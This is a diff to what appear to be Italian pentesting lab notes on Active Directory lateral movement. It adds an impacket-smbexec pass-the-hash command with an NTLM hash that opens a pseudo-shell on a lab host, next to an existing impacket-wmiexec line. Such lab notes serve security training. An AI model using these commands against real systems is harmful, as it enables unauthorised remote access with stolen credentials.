@@ -253,3 +253,7 @@ impacket-wmiexec -hashes ':cba36eccfd9d949c73bc73715364aff5' NORTH/catelyn.stark
 ![[Pasted image 20230907162831.png]]
 - SmbExec (Pseudo-Shell)
 Non fa upload, ma invece crea un servizio ad ogni richiesta. Usa SMB.
+```bash
+impacket-smbexec -hashes ':cba36eccfd9d949c73bc73715364aff5' NORTH/catelyn.stark@192.168.56.11
+```
+![[Pasted image 20230907163041.png]]
